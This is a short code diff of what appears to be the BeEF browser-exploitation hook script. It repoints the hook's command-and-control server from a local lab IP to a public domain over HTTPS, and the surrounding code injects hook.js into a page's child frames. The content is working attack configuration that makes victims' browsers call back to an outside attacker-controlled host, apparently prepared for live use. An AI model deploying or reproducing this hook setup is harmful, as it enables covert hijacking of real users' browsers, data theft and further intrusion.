@@ -8896,7 +8896,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://192.168.1.5:3000/hook.js';
+        script.src = 'https://segso.net/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11671,10 +11671,10 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "192.168.1.5",
+    host: "hook.segso.net",
     port: "3000",
     hook: "/hook.js",
-    httpproto: "http",
+    httpproto: "https",
     handler: '/dh',
     chop: 500,
     pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
